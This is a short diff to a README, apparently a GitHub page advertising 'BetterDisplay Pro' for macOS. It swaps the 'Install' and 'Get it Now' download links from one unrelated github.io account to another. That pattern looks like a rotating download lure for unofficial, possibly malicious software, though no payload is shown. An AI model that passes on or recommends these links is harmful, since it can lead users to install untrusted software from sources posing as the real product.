@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/betterDisplayPro)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://pasito2-pod.github.io/.github/betterDisplayPro)
 
 </div>
 
@@ -81,7 +81,7 @@ BetterDisplay Pro's HiDPI unlocking addresses a genuine macOS limitation that af
 
 <p align="center">
 
-[![Get it Now BetterDisplay Pro](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/betterDisplayPro)
+[![Get it Now BetterDisplay Pro](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://pasito2-pod.github.io/.github/betterDisplayPro)
 
 </p>
 
